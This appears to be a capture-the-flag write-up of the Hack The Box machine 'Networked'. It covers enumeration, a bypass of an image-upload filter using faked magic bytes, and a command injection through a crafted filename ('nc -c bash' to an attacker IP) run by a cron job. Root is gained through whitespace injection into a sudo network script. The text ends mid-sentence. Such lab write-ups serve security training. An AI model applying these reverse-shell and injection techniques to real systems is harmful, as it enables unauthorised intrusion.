## Default Information
IP Address: 10.10.10.146\
OS: Linux

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.10.146    networked.htb
```
### Masscan
Firstly, we will use masscan to identify the open ports

```
┌──(kali㉿kali)-[~]
└─$ sudo masscan -p1-65535,U:1-65535 10.10.10.146 --rate=1000 -e tun0
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-10-02 01:05:16 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 22/tcp on 10.10.10.146                                     
Discovered open port 80/tcp on 10.10.10.146 
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port. From the output, we can see that we are most likely dealing with a CentOS operating system for the backend server.

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 22 | SSH | OpenSSH 7.4 (protocol 2.0) | Open |
| 80 | HTTP | Apache httpd 2.4.6 ((CentOS) PHP/5.4.16) | Open |

Afterwards, we will use Nmap to scan for potential vulnerabilties on each of the ports. However, for this machine, we were unable to detect any vulnerabilities from the Nmap scan.

### Gobuster
We will then use Gobuster to find the endpoints that are accessible from http://networked.htb

```
http://networked.htb/uploads              (Status: 301) [Size: 237] [--> http://networked.htb/uploads/]
http://networked.htb/backup               (Status: 301) [Size: 236] [--> http://networked.htb/backup/]
```
We will also tried to find virtual hosts on http://networked.htb, but we were unable to find any vhosts.

Next, we will try to use Gobuster to do an enumeration for common files extensions such as .js,.txt,.php and .html.

```
http://networked.htb/index.php            (Status: 200) [Size: 229]
http://networked.htb/photos.php           (Status: 200) [Size: 1302]
http://networked.htb/uploads              (Status: 301) [Size: 237] [--> http://networked.htb/uploads/]
http://networked.htb/upload.php           (Status: 200) [Size: 169]
http://networked.htb/lib.php              (Status: 200) [Size: 0]
http://networked.htb/backup               (Status: 301) [Size: 236] [--> http://networked.htb/backup/]
```
Enumerating the endpoints /uploads and /backup with Gobuster did not come back with any promising findings as well. 

### Web-content discovery

From the results from Gobuster, we were able to find http://networked/upload.php which seems to be an upload page for images. 

From here, we will try to modify the content-type and file extensions to upload files onto the gallery. However, it seems that we are unable to do so. Perhaps, there is some file content filtering of some sort at the backend. Double extensions files also seem to be unable to get uploaded as well. 

![Modifying file extensions](https://github.com/joelczk/writeups/blob/main/HTB/Images/Networked/file_extensions.PNG)

Let's check out other endpoints first before coming back to this. Visiting http://networked.htb/backup/, we notice that there is a backup.tar file that we can download. After we untar the backup.tar file that was downloaded, we realize that it contains the source code for the website.

### Source code Analysis

_upload.php_

From upload.php, we can see that that file upload logic goes by first checking the file type before checking the file extensions

```php
    if (!(check_file_type($_FILES["myFile"]) && filesize($_FILES['myFile']['tmp_name']) < 60000)) {
      echo '<pre>Invalid image file.</pre>';
      displayform();
    }

    if ($myFile["error"] !== UPLOAD_ERR_OK) {
        echo "<p>An error occurred.</p>";
        displayform();
        exit;
    }

    //$name = $_SERVER['REMOTE_ADDR'].'-'. $myFile["name"];
    list ($foo,$ext) = getnameUpload($myFile["name"]);
    $validext = array('.jpg', '.png', '.gif', '.jpeg');
    $valid = false;
    foreach ($validext as $vext) {
      if (substr_compare($myFile["name"], $vext, -strlen($vext)) === 0) {
        $valid = true;
      }
    }
```

_lib.php_
In lib.php, the 2 main functions that are of concern are ```getNameUpload``` and ```check_file_type```. ```getNameUpload``` obtains the file name and the file extensions, while ```check_file__type``` checks the file mime type of the uploaded files. 

```
function getnameUpload($filename) {
  $pieces = explode('.',$filename);
  $name= array_shift($pieces);
  $name = str_replace('_','.',$name);
  $ext = implode('.',$pieces);
  return array($name,$ext);
}
....
function check_file_type($file) {
  $mime_type = file_mime_type($file);
  if (strpos($mime_type, 'image/') === 0) {
      return true;
  } else {
      return false;
  }  
}
```
## Exploit
From the source code analysis, we can see that the magic bytes in the file are being checked in the ```file_mime_type``` function. This tells us that we can upload other file extensions by simply bypassing the magic headers or introducing a shell in the metadata. For this exploit, we will bypass the magic headers instead

Let's modify the file extensions and the magic bytes in the ```exploit.php``` file using any hexeditor, and save the file as a jpeg file. Afterwards, we will upload the file onto the website 

![Magic bytes in hex editor](https://github.com/joelczk/writeups/blob/main/HTB/Images/Networked/hex_editor.PNG)

### Obtaining reverse shell

Browsing to the uploaded image on /photos.php will give us a reverse shell.

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 4000
listening on [any] 4000 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.10.146] 34666
Linux networked.htb 3.10.0-957.21.3.el7.x86_64 #1 SMP Tue Jun 18 16:35:19 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 07:00:25 up 16:43,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
sh-4.2$ 
```
Next, all we have to do is to stabilize the shell

```
┌──(kali㉿kali)-[~]
└─$ fg                                                                        130 ⨯ 1 ⚙
[1]  + continued  nc -nlvp 4000
export TERM=xterm
export TERM=xterm
bash-4.2$ stty cols 132 rows 34
stty cols 132 rows 34
bash-4.2$ whoami        
whoami
apache
bash-4.2$
```

We realize that we do not have the permissions to view user.txt file. Hence, we have to escalate our privileges to guly to be able to view the user flag.

```
bash-4.2$ cd /home/guly
cd /home/guly
bash-4.2$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
```

However, we realize that we have a file, crontab.guly which shows that check_attack.php is being executed on a cron job. 

```
bash-4.2$ ls
ls
check_attack.php  crontab.guly  user.txt
bash-4.2$ cat crontab.guly
cat crontab.guly
*/3 * * * * php /home/guly/check_attack.php
```

### Code analysis of check_attack.php
we have identified possible command injection from check_attack.php, where the $path is /var/www/html/uploads/ and $value is the filename in the path

```
exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
```

### Privilege Esacalation to guly

Now, we will exploit the command injection vulnerability in check_attack.sh by creating a file in /var/www/html/uploads

```
bash-4.2$ touch ';nc -c bash 10.10.16.4 5000'
touch ';nc -c bash 10.10.16.4 5000'
```

By doing so, we are essentially executing the following command in check_attack.sh, which will create a reverse shell belonging to guly. 

```
exec("nohup /bin/rm -f; nc -c 10.10.16.4 5000 > /dev/null 2>&1 &");
```

### Obtaining user flag

As usual, we will stabilize the reverse shell and obtain the user flag

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 5000
listening on [any] 5000 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.10.146] 56708
python -c 'import pty; pty.spawn("/bin/bash")'
[guly@networked ~]$ export TERM=xterm
sexport TERM=xterm
[guly@networked ~]$stty cols 132 rows 34
stty cols 132 rows 34
[guly@networked ~]$ cd /home/guly
cd /home/guly
[guly@networked ~]$ cat user.txt
cat user.txt
<Redacted user flag>
[guly@networked ~]$ 
```
### Source code analysis of changename.sh

Executing sudo -l, we realize that we are able to execute changename.sh command with root privileges

```
[guly@networked ~]$ sudo -l
sudo -l
Matching Defaults entries for guly on networked:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME
    HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh
```

Looking at changename.sh, we can see that the script will tatke in an input from us and append it to /etc/sysconfig/network-scripts/ifcfg-guly

```
#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
        echo "interface $var:"
        read x
        while [[ ! $x =~ $regexp ]]; do
                echo "wrong input, try again"
                echo "interface $var:"
                read x
        done
        echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done
  
/sbin/ifup guly0
```

### Privilege escalation to root

From [here](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f), we realize that if there is a white space in our input, the system will try to execute the part after the white space.
We can then add use the following input ```test bash``` to escalate our privileges to root privileges

```
[guly@networked ~]$ sudo /usr/local/sbin/changename.sh
sudo /usr/local/sbin/changename.sh
interface NAME:
test bash
test bash
interface PROXY_METHOD:
test bash
test bash
interface BROWSER_ONLY:
test bash
test bash
interface BOOTPROTO:
test bash
test bash
[root@networked network-scripts]# 
```
### Obtaining root flag

```
[root@networked ~]# cat /root/root.txt
cat /root/root.txt
<Redacted root flag>
[root@networked ~]# 
```
## Post-exploitation
### Command Injection
It is noticed that ```/``` is an illegal character in creating file names as the server would interpret ```/``` as a directory and as a result, it will be unable to create the file on /var/www/html/upload directory (Unless the file with ```/``` exists on the terminal)
 When creating the reverse shell for 
